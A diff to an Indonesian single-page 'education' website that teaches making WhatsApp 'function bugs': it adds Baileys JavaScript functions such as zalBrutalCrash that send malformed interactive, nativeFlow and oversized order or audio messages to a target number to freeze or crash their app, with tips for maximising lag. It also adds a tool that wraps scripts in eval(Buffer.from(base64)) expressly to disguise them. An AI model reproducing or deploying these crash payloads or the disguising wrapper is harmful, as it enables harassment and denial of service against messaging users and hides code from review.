@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Website Edukasi Seputar Hosting</title>
+  <title>Website Edukasi DevZal</title>
   <style>
     * { box-sizing: border-box; }
     html, body {
@@ -26,11 +26,11 @@
       box-shadow: 0 0 25px rgba(0, 204, 255, 0.35);
       border-radius: 14px;
       padding: 1rem 1.5rem;
-      width: 90%;
-      max-width: 500px;
+      width: 95%;
+      max-width: 1000px;
       text-align: center;
       animation: fadeIn 1s ease;
-      max-height: 90vh;
+      max-height: 95vh;
       overflow-y: auto;
     }
     @keyframes fadeIn {
@@ -39,16 +39,15 @@
     }
     input[type="text"] {
       width: 100%;
-      padding: 6px;
+      padding: 10px;
       margin: 0.5rem 0;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       background: rgba(255,255,255,0.1);
       color: white;
-      font-size: 0.75rem;
+      font-size: 0.9rem;
     }
     button {
-      width: 100%;
       padding: 6px;
       border: none;
       border-radius: 6px;
@@ -64,28 +63,47 @@
       transform: scale(1.05);
       box-shadow: 0 0 20px #00ccffcc;
     }
-    .menu-materi {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 0.4rem;
+    .scroll-container {
+      overflow-x: auto;
       margin-top: 1rem;
     }
+.btn {
+  display: block;
+  width: 100%;
+  margin: 0.6rem 0; /* tambah jarak antar tombol */
+  padding: 14px;     /* lebih empuk diklik */
+  font-size: 1rem;
+  background: linear-gradient(145deg, #99e6ff, #66ccff);
+  border: none;
+  border-radius: 10px;
+  color: #000;
+  font-weight: bold;
+  box-shadow: 0 0 12px #00ccff88;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+    .menu-materi {
+      display: grid;
+      grid-template-rows: repeat(3, auto);
+      grid-auto-flow: column;
+      gap: 8px;
+      padding-bottom: 10px;
+      min-width: max-content;
+    }
     .menu-materi button {
-      padding: 6px;
-      font-size: 0.7rem;
-      border-radius: 6px;
+      white-space: nowrap;
     }
     #dashboard, #materiPage {
       display: none;
     }
     #kontenMateri {
       text-align: left;
-      margin-top: 0.8rem;
+      margin-top: 1rem;
       background: rgba(255,255,255,0.05);
       padding: 0.6rem;
       border-radius: 6px;
-      font-size: 0.7rem;
-      line-height: 1.4;
+      font-size: 0.8rem;
+      line-height: 1.5;
       max-height: 50vh;
       overflow-y: auto;
     }
@@ -94,67 +112,154 @@
 <body>
   <div class="glass" id="loginContainer">
     <h3 style="text-shadow: 0 0 10px white; font-size: 1rem; margin-bottom: 10px;">Masukkan Nama Kamu</h3>
-    <input id="nama" placeholder="Contoh: Zal Ganteng" style="padding: 10px; width: 80%; border-radius: 8px; border: none; outline: none; font-size: 0.9rem; text-align: center; box-shadow: 0 0 5px rgba(255,255,255,0.5); margin-bottom: 10px;">
+    <input id="nama" placeholder="Contoh: Dev Zal">
     <br>
-    <button onclick="login()" style="margin-top: 10px; padding: 8px 20px; border-radius: 8px; border: none; background-color: #3498db; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #3498db;">
-      Login
-    </button>
+    <button onclick="login()">Login</button>
   </div>
-  </div>
+
   <div class="glass" id="dashboard">
-    <h3 id="welcomeMsg" style="font-size: 0.9rem;"></h3>
-    <p style="font-size: 0.75rem;">Pilih materi yang ingin kamu pelajari:</p>
-    <div class="menu-materi">
-      <button onclick="showMateri('functionBug')">Function Bug</button>
-      <button onclick="showMateri('scriptWa')">Script WhatsApp</button>
-      <button onclick="showMateri('struktur')">Struktur Project</button>
-      <button onclick="showMateri('scriptTelegram')">Script Telegram</button>
-      <button onclick="showMateri('pasangFunction')">Pasang Function Bug</button>
-      <button onclick="showMateri('handler')">Command Handler Bot</button>
-      <button onclick="showMateri('proteksi')">Lindungi Script</button>
-      <button onclick="showMateri('hosting')">Hosting di VPS</button>
-      <button onclick="showMateri('pterodactyl')">Panel Pterodactyl</button>
-      <button onclick="showMateri('autodeploy')">Auto Deploy Bot</button>
-      <button onclick="showMateri('jsonapi')">JSON & API</button>
-      <button onclick="showMateri('obfuscate')">Obfuscate & Protect</button>
-      <button onclick="showMateri('panelWeb')">Website Panel Sendiri</button>
-      <button onclick="showMateri('uploadVPS')">Upload File ke VPS</button>
-      <button onclick="showMateri('apaItuBug')">Apa Itu Bug WA</button>
-<button onclick="showMateri('caraKerjaBug')">Cara Kerja Bug</button>
-<button onclick="showMateri('jenisBug')">Jenis-Jenis Bug</button>
-<button onclick="showMateri('kenapaTerjadi')">Kenapa Bisa Terjadi</button>
-<button onclick="showMateri('contohPayload')">Contoh Payload</button>
-<button onclick="showMateri('deteksiBug')">Deteksi Bug WA</button>
-<button onclick="showMateri('perlindungan')">Perlindungan dari Bug</button>
-<button onclick="showMateri('etika')">Etika & Legalitas</button>
-<button onclick="showMateri('perbedaanDevice')">Bug Mobile vs Web</button>
-<button onclick="showMateri('efektifitas2025')">Efektivitas di 2025</button>
-<button onclick="showMateri('perbedaanBugVirus')">Perbedaan Bug Dan Virus</button>
-<button onclick="showMateri('macamVirus')">Macam-macam Virus</button>
-<button onclick="showMateri('apaItuVirus')">Apa Itu Virus</button>
-<button onclick="showMateri('strukturCrash')">Struktur WhatsApp Crash</button>
-<button onclick="showMateri('deteksiFile')">Deteksi File Berbahaya</button>
-<button onclick="showMateri('bedabot')">Bot Client vs Baileys</button>
-<button onclick="showMateri('obfuscateExtreme')">Obfuscate Ekstrem</button>
-<button onclick="showMateri('customPayload')">Payload Custom</button>
-<button onclick="showMateri('crashTanpaFile')">Crash Tanpa File</button>
-<button onclick="showMateri('pushInvisible')">Push WA Tanpa Simpan</button>
+    <h3 id="welcomeMsg" style="font-size: 1rem;"></h3>
+    <p style="font-size: 0.8rem;">Pilih materi yang ingin kamu pelajari:</p>
+    
+    <div class="scroll-container">
+      <div class="menu-materi">
+        <button onclick="showMateri('functionBug')">Function Bug</button>
+        <button onclick="showMateri('scriptWa')">Script WhatsApp</button>
+        <button onclick="showMateri('struktur')">Struktur Project</button>
+        <button onclick="showMateri('scriptTelegram')">Script Telegram</button>
+        <button onclick="showMateri('pasangFunction')">Pasang Function Bug</button>
+        <button onclick="showMateri('handler')">Command Handler Bot</button>
+        <button onclick="showMateri('proteksi')">Lindungi Script</button>
+        <button onclick="showMateri('hosting')">Hosting di VPS</button>
+        <button onclick="showMateri('pterodactyl')">Panel Pterodactyl</button>
+        <button onclick="showMateri('autodeploy')">Auto Deploy Bot</button>
+        <button onclick="showMateri('jsonapi')">JSON & API</button>
+        <button onclick="showMateri('obfuscate')">Obfuscate & Protect</button>
+        <button onclick="showMateri('panelWeb')">Website Panel Sendiri</button>
+        <button onclick="showMateri('uploadVPS')">Upload File ke VPS</button>
+<button onclick="showMateri('carabuatFunc')">Cara Buat Function Bug</button>
+        <button onclick="showMateri('customPayload')">Custom Payload</button>
+        <button onclick="showMateri('deteksiBug')">Deteksi Bug</button>
+        <button onclick="showMateri('strukturCrash')">Struktur Crash</button>
+        <button onclick="showMateri('etika')">Etika & Legalitas</button>
+        <button onclick="showMateri('perbedaanBugVirus')">Bug vs Virus</button>
+        <button onclick="showMateri('pushInvisible')">Push Tanpa Simpan</button>
+<button onclick="bukaErrorChecker()">Cek Error JS</button>
+<button onclick="bukaEncodeTools()">Encode & Decode Tools</button>
+<button onclick="bukaPasswordGenerator()">Password Generator</button>
+
+      </div>
     </div>
-<div style="text-align: center; margin-top: 30px;">
-  <p style="color: #ccc; font-size: 10px;">
-    Website ini bertujuan untuk belajar tentang seputar hosting
-  </p>
-  <a href="https://wa.me/6289524134626" target="_blank" style="display: inline-block; margin-top: 5px; padding: 5px 10px; background: #007BFF; color: white; border-radius: 5px; text-decoration: none; font-weight: bold;">
-    Hubungi Developer
-  </a>
+
+    <div style="text-align: center; margin-top: 30px;">
+      <p style="color: #ccc; font-size: 10px;">
+        Website ini bertujuan untuk belajar tentang seputar hosting dan keamanan.
+      </p>
+      <a href="https://wa.me/6289524134626" target="_blank" style="display: inline-block; margin-top: 5px; padding: 5px 10px; background: #007BFF; color: white; border-radius: 5px; text-decoration: none; font-weight: bold;">
+        Hubungi Developer
+      </a>
+    </div>
+  </div>
+<div class="glass" id="ipChecker" style="display:none">
+  <h3 style="font-size: 1.4rem; text-align:center;">
+  <span style="color:#00eaff; text-shadow:0 0 10px #00ffffaa;">🔍 IP & Device Info</span>
+</h3>
+  <div class="info-box" id="ip">IP: Memuat...</div>
+  <div class="info-box" id="ua">User Agent: Memuat...</div>
+  <div class="info-box" id="os">Sistem Operasi: Memuat...</div>
+  <div class="info-box" id="browser">Browser: Memuat...</div>
+  <div class="info-box" id="location">Lokasi: Memuat...</div>
+  <br>
+  <button onclick="kembaliDashboard()">⬅️ Kembali</button>
+</div>
+
+  <!-- Bagian materiPage -->
+<div class="glass" id="materiPage">
+  <h3 id="judulMateri" style="font-size: 1rem;"></h3>
+  <div id="kontenMateri"></div>
+  <br>
+  <button onclick="kembaliDashboard()">⬅ Kembali</button>
+</div>
+<div class="glass" id="encodeTools" style="display:none;">
+  <h3 style="text-align:center; color:#66ccff; text-shadow: 0 0 10px white;">🔧 Encode & Decode Tools</h3>
+
+  <input type="file" accept=".js,.txt" onchange="handleFile(event)" class="btn" style="margin:auto; display:block;"/>
+
+  <div class="input-area" style="display:flex; flex-wrap:wrap; gap:15px; margin-top:1rem;">
+    <textarea id="inputText" placeholder="✍️ Paste teks/script..." style="flex:1 1 48%; height:220px; background:#0e1c26; color:#aafaff;"></textarea>
+    
+    <div style="flex:1 1 48%; display:flex; flex-direction:column;">
+      <textarea id="outputText" placeholder="💬 Hasil..." readonly style="height:220px; background:#0e1c26; color:#aafaff;"></textarea>
+      <button class="btn" onclick="salinHasil()">📋 Salin Hasil</button>
+      <p id="notifSalin" style="text-align:center; font-size:0.85rem;"></p>
+    </div>
+  </div>
+
+  <div style="margin-top:1rem; text-align:center;">
+    <button class="btn" onclick="encodeText()">🔐 Encode</button>
+    <button class="btn" onclick="decodeText()">🔓 Decode</button>
+    <button class="btn" onclick="resetText()">🧹 Reset</button>
+    <br><br>
+    <button onclick="kembaliDariEncodeTools()">⬅ Kembali ke Dashboard</button>
+  </div>
+
+  <div class="info" style="margin-top:2rem; font-size:0.85rem;">
+    <strong>🔎 Penjelasan:</strong><br>
+    Encode: mengubah teks jadi Base64<br>
+    Decode: mengembalikan dari Base64<br>
+    Output encode dibungkus pakai `eval(Buffer.from(...))` buat penyamaran script.
   </div>
 </div>
-  <div class="glass" id="materiPage">
-    <h3 id="judulMateri" style="font-size: 0.9rem;"></h3>
-    <div id="kontenMateri"></div>
-    <br>
-    <button onclick="kembaliDashboard()">⬅ Kembali</button>
+<div class="glass" id="passwordGenerator" style="display:none;">
+  <h3 style="text-align:center; color:#aeefff; text-shadow: 0 0 10px white;">🔐 Password Generator</h3>
+
+  <label style="margin-top: 10px;">
+    🔢 Panjang Password:
+    <input type="number" id="length" value="12" min="4" max="50" style="width: 60px; padding: 5px; margin-left: 8px;">
+  </label>
+
+  <label><input type="checkbox" id="includeUpper" checked> Gunakan Huruf Besar</label><br>
+  <label><input type="checkbox" id="includeNumbers" checked> Gunakan Angka</label><br>
+  <label><input type="checkbox" id="includeSymbols" checked> Gunakan Simbol</label><br>
+
+  <div style="margin-top: 15px; background:#0e1c26; padding: 15px; border-radius: 10px; border: 1px solid #66ccff; color:#aafaff;" id="passwordOutput">
+    Password akan muncul di sini
   </div>
+
+  <div style="margin-top: 10px; text-align:center;">
+    <button class="btn" onclick="generatePassword()">🔁 Generate Password</button>
+    <button class="btn" onclick="salinPassword()">📋 Salin Password</button><br><br>
+    <button onclick="kembaliDariPasswordGenerator()">⬅ Kembali ke Dashboard</button>
+  </div>
+
+  <div class="footer" style="margin-top:20px; font-size: 0.85rem; color:#ccc; text-align:center;">
+    Website ini membantu kamu membuat password aman dan acak.<br>
+    Contact Dev Zal: <a href="https://wa.me/628xxxxxx" style="color:#66ccff;">Klik di sini</a>
+  </div>
+</div>
+<!-- Tambahkan langsung di bawah sini -->
+<div class="glass" id="errorChecker" style="display:none;">
+  <h3 style="text-align:center; color:#66ccff; text-shadow: 0 0 10px white;">🧠 The End Checker</h3>
+
+  <div class="btn-group" style="text-align:center;">
+    <input type="file" accept=".js" onchange="handleFile(event)" class="btn"/>
+    <button class="btn" onclick="jalankan()">Cek Error</button>
+    <button class="btn" onclick="reset()">Reset</button>
+  </div>
+
+  <div class="input-area" style="display:flex; flex-wrap:wrap; gap:15px; justify-content:space-between; margin-top:1rem;">
+    <textarea id="code" placeholder="Paste script JS kamu di sini..." style="flex:1 1 48%; height:300px; background:#0e1c26; color:#aafaff;"></textarea>
+    <div class="output" style="flex:1 1 48%; display:flex; flex-direction:column; gap:10px;">
+      <div class="info-box" id="hasil">Hasil error akan tampil di sini</div>
+      <div class="info-box" id="arti">Arti error akan dijelaskan di sini</div>
+      <div class="info-box" id="solusi">Solusi akan muncul di sini</div>
+    </div>
+  </div>
+
+  <div style="text-align:center; margin-top:1rem;">
+    <button onclick="kembaliDariErrorChecker()">⬅ Kembali ke Dashboard</button>
+  </div>
+</div>
   <script>
     function login() {
       const user = document.getElementById("nama").value.trim();
@@ -176,6 +281,7 @@
       const konten = document.getElementById("kontenMateri");
 
       const daftarJudul = {
+      carabuatFunc: "Gimana Cara Buat Function Bug?",
         functionBug: "Apa Itu Function Bug?",
         scriptWa: "Cara Buat Script WhatsApp",
         struktur: "Struktur Project Script",
@@ -213,6 +319,172 @@ obfuscateExtreme: "Teknik Obfuscate Ekstrem + Anti Decode",
       };
 
       const daftarKonten = {
+      carabuatFunc: ` <h1>Cara Membuat Function Bug WhatsApp</h1>
+
+    <div class="penjelasan">
+      Untuk membuat <strong>function bug</strong>, kamu perlu pahami struktur pesan WhatsApp. Bug dikirim via <code>relayMessage</code> dengan isi struktur kompleks atau abnormal yang memicu crash, freeze, lag, atau force close, struktur nya di bawah.
+    </div>
+
+    <h2>Contoh Dasar Function</h2>
+    <pre><code>async function kirimBug(jid, sock) {
+  const bug = {
+    nativeFlowMessage: {
+      buttonParamsJson: JSON.stringify({ title: "ZalDestroy", sections: [] }),
+      messageParamsJson: JSON.stringify({ text: "Bug Native", footer: "ZalTeam" })
+    }
+  };
+  await sock.sendMessage(jid, bug);
+}</code></pre>
+
+    <h2>nativeFlowMessage</h2>
+    <pre><code>{
+  nativeFlowMessage: {
+    buttonParamsJson: JSON.stringify({ title: "Zal", sections: [] }),
+    messageParamsJson: JSON.stringify({ text: "Native Flow", footer: "Zal" })
+  }
+}</code></pre>
+
+    <h2>carouselMessage</h2>
+    <pre><code>{
+  carouselMessage: {
+    cards: [],
+    title: "Zal Carousel",
+    description: "Trigger freeze"
+  }
+}</code></pre>
+
+    <h2>interactiveMessage</h2>
+    <pre><code>{
+  interactiveMessage: {
+    body: { text: "🧨 Crash Click" },
+    footer: { text: "Klik cepat" },
+    action: {
+      button: "Zal",
+      sections: [{ title: "Crash", rows: [] }]
+    }
+  }
+}</code></pre>
+
+    <h2>newsletterAdminInviteMessage</h2>
+    <pre><code>{
+  newsletterAdminInviteMessage: {
+    name: "Zal Channel",
+    inviteCode: "ZALBUG123",
+    inviteExpiration: "999999999",
+    caption: "Gabung",
+    thumbnailUrl: "https://zal.img"
+  }
+}</code></pre>
+
+    <h2>orderMessage</h2>
+    <pre><code>{
+  orderMessage: {
+    orderId: "ZAL123",
+    itemCount: 9999,
+    totalAmount1000: 9999999,
+    status: 1
+  }
+}</code></pre>
+
+    <h2>Struktur - contactMessage</h2>
+    <pre><code>{
+  contactMessage: {
+    displayName: "Bug Contact",
+    vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:ZalBug\nTEL:+99999999\nEND:VCARD"
+  }
+}</code></pre>
+
+    <h2>groupInviteMessage</h2>
+    <pre><code>{
+  groupInviteMessage: {
+    groupJid: "1203xxx@g.us",
+    groupName: "Bug Group",
+    caption: "Masuk cepat",
+    jpegThumbnail: fs.readFileSync('./bug.jpg'),
+    inviteCode: "ZALCODE"
+  }
+}</code></pre>
+
+    <h2>Struktur - productMessage</h2>
+    <pre><code>{
+  productMessage: {
+    productImageCount: 9999,
+    priceAmount1000: 999999,
+    currencyCode: "USD",
+    title: "Produk ZalBug"
+  }
+}</code></pre>
+
+    <h2>audioMessage (Delay Bug)</h2>
+    <pre><code>{
+  audioMessage: {
+    url: "https://bug.zal.com/freeze.mp4",
+    mimetype: "audio/mp4",
+    ptt: true,
+    seconds: 99999,
+    fileLength: "9999999"
+  }
+}</code></pre>
+
+    <div class="box">
+      <h2>Contoh Function Bug</h2>
+      <pre><code>async function zalBrutalCrash(jid, sock) {
+  const payload = {
+    nativeFlowMessage: {
+      buttonParamsJson: JSON.stringify({
+        title: "💀 ZAL BRUTAL MODE 💀",
+        sections: Array(20).fill({
+          title: "⚠️ Zal Exploit Zone",
+          rows: Array(30).fill({ title: "⚡ Freeze Trigger", rowId: "ZAL_LAG_SYSTEM" })
+        })
+      }),
+      messageParamsJson: JSON.stringify({
+        text: "Zal Crash System",
+        footer: "ZalOfficial Exploit"
+      })
+    },
+    interactiveMessage: {
+      body: { text: "⛔ DO NOT CLICK!" },
+      footer: { text: "💣 Zal Bug Activated" },
+      action: {
+        button: "💥 Activate",
+        sections: [
+          {
+            title: "Danger Zone",
+            rows: [
+              { title: "🧨 Crash1", rowId: "zal1" },
+              { title: "🧨 Crash2", rowId: "zal2" },
+              { title: "🧨 Crash3", rowId: "zal3" }
+            ]
+          }
+        ]
+      }
+    },
+    newsletterAdminInviteMessage: {
+      name: "ZalBugBroadcast",
+      inviteCode: "CRASHFORCE",
+      inviteExpiration: "9999999999",
+      caption: "ZalBroadcast Bug Mode",
+      thumbnailUrl: "https://telegra.ph/file/b66d6f5a7ac32a3c5e5c9.jpg"
+    }
+  };
+
+  await sock.sendMessage(jid, payload);
+}</code></pre>
+    </div>
+    <h2>Tips & Catatan</h2>
+    <div class="penjelasan">
+      • Selalu test bug di akun dummy dulu<br>
+      • Gunakan file kecil yang padat isi atau struktur kompleks JSON kosong<br>
+      • Kombinasi delay + struktur nativeFlow paling banyak menimbulkan lag<br>
+      • Semua struktur bisa digabung ke dalam satu relayMessage
+    </div>
+
+    <h2>Kontak Developer ZalOfficial</h2>
+    <div class="penjelasan">
+      Web ini dibuat untuk edukasi struktur function bug WA (Baileys/MultiDevice).<br><br>
+      Hubungi: <a href="https://wa.me/6289524134626" target="_blank">Klik untuk WhatsApp Dev Zal</a>
+    </div>`,
         crashTanpaFile: `<h3>💣 Teknik Crash WhatsApp Tanpa Kirim File</h3>
 <p>Banyak orang mengira crash hanya bisa dilakukan lewat file besar. Nyatanya, kamu bisa menyebabkan lag/crash hanya dengan satu baris pesan.</p>
 
@@ -1306,7 +1578,205 @@ module.exports = kirimBug;
         ? `<p>${daftarKonten[id]}</p>`
         : `<p>(Penjelasan untuk <strong>${judul.textContent}</strong> belum tersedia.)</p>`;
     }
+function bukaErrorChecker() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("materiPage").style.display = "none";
+  document.getElementById("errorChecker").style.display = "block";
+}
+function bukaEncodeTools() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("encodeTools").style.display = "block";
+}
 
+function kembaliDariEncodeTools() {
+  document.getElementById("encodeTools").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+}
+
+function encodeText() {
+  const input = document.getElementById("inputText").value;
+  const encoded = btoa(unescape(encodeURIComponent(input)));
+  const wrapped = `eval(Buffer.from("${encoded}", "base64").toString())`;
+  document.getElementById("outputText").value = wrapped;
+}
+
+function decodeText() {
+  const input = document.getElementById("inputText").value;
+  try {
+    const decoded = decodeURIComponent(escape(atob(input)));
+    document.getElementById("outputText").value = decoded;
+  } catch (e) {
+    document.getElementById("outputText").value = "❌ Decode gagal! Pastikan teks benar.";
+  }
+}
+
+function resetText() {
+  document.getElementById("inputText").value = "";
+  document.getElementById("outputText").value = "";
+}
+
+function salinHasil() {
+  const output = document.getElementById("outputText").value;
+  if (!output) return alert("⛔ Belum ada hasil untuk disalin!");
+  navigator.clipboard.writeText(output).then(() => {
+    const notif = document.getElementById("notifSalin");
+    notif.textContent = "✅ Hasil disalin ke clipboard!";
+    setTimeout(() => notif.textContent = "", 2000);
+  });
+}
+
+function handleFile(event) {
+  const file = event.target.files[0];
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    document.getElementById("inputText").value = e.target.result;
+  };
+  reader.readAsText(file);
+}
+function kembaliDariErrorChecker() {
+  document.getElementById("errorChecker").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+}
+function bukaPasswordGenerator() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("passwordGenerator").style.display = "block";
+}
+
+function kembaliDariPasswordGenerator() {
+  document.getElementById("passwordGenerator").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+}
+
+function generatePassword() {
+  const length = parseInt(document.getElementById('length').value);
+  const includeUpper = document.getElementById('includeUpper').checked;
+  const includeNumbers = document.getElementById('includeNumbers').checked;
+  const includeSymbols = document.getElementById('includeSymbols').checked;
+
+  const lower = 'abcdefghijklmnopqrstuvwxyz';
+  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  const numbers = '0123456789';
+  const symbols = '!@#$%^&*()_+[]{}<>?|';
+
+  let charset = lower;
+  if (includeUpper) charset += upper;
+  if (includeNumbers) charset += numbers;
+  if (includeSymbols) charset += symbols;
+
+  if (!charset) {
+    document.getElementById('passwordOutput').textContent = "❌ Pilih minimal satu opsi.";
+    return;
+  }
+
+  let password = '';
+  for (let i = 0; i < length; i++) {
+    const random = Math.floor(Math.random() * charset.length);
+    password += charset[random];
+  }
+
+  document.getElementById('passwordOutput').textContent = password;
+}
+
+function salinPassword() {
+  const output = document.getElementById('passwordOutput').textContent;
+  if (!output || output === "Password akan muncul di sini" || output.includes("❌")) return;
+
+  navigator.clipboard.writeText(output).then(() => {
+    alert("✅ Password berhasil disalin!");
+  });
+}
+  function bukaIPChecker() {
+    document.getElementById("dashboard").style.display = "none";
+    document.getElementById("ipChecker").style.display = "block";
+
+    document.getElementById("ua").textContent = "User Agent: " + navigator.userAgent;
+    const os = navigator.platform || "Tidak terdeteksi";
+    document.getElementById("os").textContent = "Sistem Operasi: " + os;
+    const browser = (() => {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Edge")) return "Edge";
+      return "Tidak diketahui";
+    })();
+    document.getElementById("browser").textContent = "Browser: " + browser;
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("ip").textContent = "IP: " + data.ip;
+      })
+      .catch(() => {
+        document.getElementById("ip").textContent = "IP: Gagal dimuat";
+      });
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude } = pos.coords;
+        document.getElementById("location").textContent = `Lokasi: Lat ${latitude.toFixed(4)}, Long ${longitude.toFixed(4)}`;
+      }, err => {
+        document.getElementById("location").textContent = "Lokasi: Tidak diizinkan";
+      });
+    } else {
+      document.getElementById("location").textContent = "Lokasi: Tidak didukung";
+    }
+  }
+
+const questions = [
+  { q: "Apa fungsi utama file package.json?", o: ["Konfigurasi project", "Backup file", "Log sistem", "Versi git"], a: 0 },
+  { q: "Apa itu Webhook?", o: ["Pengirim data otomatis via POST", "Bot handler", "Database", "Server listener"], a: 0 },
+  { q: "Perintah upload file ke VPS dengan SCP?", o: ["scp file.js user@ip:/folder", "upload vps", "push file", "send.js"], a: 0 },
+  { q: "Cara obfuscate file?", o: ["Gunakan JsConfuser", "Convert ke pdf", "Rename ke .mp3", "Gunakan npm run dev"], a: 0 },
+  { q: "Apa itu JSON?", o: ["Format pertukaran data", "Framework JS", "Bahasa pemrograman", "Tool Linux"], a: 0 }
+];
+
+let current = 0, score = 0, used = [];
+
+function bukaKuis() {
+  document.getElementById('dashboard').style.display = 'none';
+  document.getElementById('kuisContainer').style.display = 'block';
+  score = 0;
+  used = [];
+  loadQuestion();
+}
+
+function kembaliDashboard() {
+  document.getElementById('kuisContainer').style.display = 'none';
+  document.getElementById('scoreArea').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
+}
+
+function loadQuestion() {
+  if (used.length >= questions.length) return showScore();
+  let index;
+  do {
+    index = Math.floor(Math.random() * questions.length);
+  } while (used.includes(index));
+  used.push(index);
+  current = index;
+  const q = questions[index];
+  document.getElementById('question').textContent = q.q;
+  const options = document.getElementById('options');
+  options.innerHTML = "";
+  q.o.forEach((opt, i) => {
+    const btn = document.createElement("button");
+    btn.className = "btn";
+    btn.textContent = opt;
+    btn.onclick = () => {
+      if (i === q.a) score++;
+      loadQuestion();
+    };
+    options.appendChild(btn);
+  });
+}
+
+function showScore() {
+  document.getElementById("question").textContent = "✅ Kuis Selesai!";
+  document.getElementById("options").style.display = "none";
+  document.getElementById("scoreArea").style.display = "block";
+  document.getElementById("scoreText").textContent = `Skor Kamu: ${score} / ${used.length}`;
+}
     function kembaliDashboard() {
       document.getElementById("materiPage").style.display = 'none';
       document.getElementById("dashboard").style.display = 'block';
